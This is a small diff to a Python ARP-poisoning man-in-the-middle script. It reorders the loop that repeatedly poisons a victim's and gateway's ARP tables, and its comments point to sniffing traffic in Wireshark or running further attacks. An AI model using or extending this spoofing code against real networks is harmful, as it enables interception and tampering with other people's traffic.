@@ -74,8 +74,8 @@ def mitm():
 	print("[*] Poisoning Targets...") # Not DNS Cache Poisoning (just need local IP and MAC addresses)
 	while 1:
 		try:
-			trick(gateMAC, victimMAC)
 			time.sleep(10) # Change to amount of time needed for wireshark or to whatever modifications/attacks needed (in seconds)
+			trick(gateMAC, victimMAC)
 		except Exception:
 			reARP()
 			break
